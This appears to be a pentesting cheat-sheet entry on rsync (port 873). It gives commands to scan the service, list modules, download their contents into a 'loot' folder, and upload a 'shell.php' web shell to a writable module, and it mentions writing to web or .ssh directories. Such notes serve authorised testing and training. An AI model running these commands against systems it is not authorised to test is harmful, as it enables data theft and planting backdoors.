# Rsync (Port 873)

Rsync can expose files and even allow you to upload. Always check.

## Nmap

```bash
nmap -sV -sC -p 873 <target ip>
```

## Enumeration

```bash
# list available modules (shares)
rsync --list-only rsync://<target ip>/

# list files in a module
rsync --list-only rsync://<target ip>/<module>/

# download everything from a module
rsync -av rsync://<target ip>/<module>/ ./loot/

# with credentials
rsync -av rsync://user@<target ip>/<module>/ ./loot/

# upload a file (if writable)
rsync -av shell.php rsync://<target ip>/<module>/shell.php
```

If you can write to a web directory or a user's .ssh folder, same techniques as NFS apply.
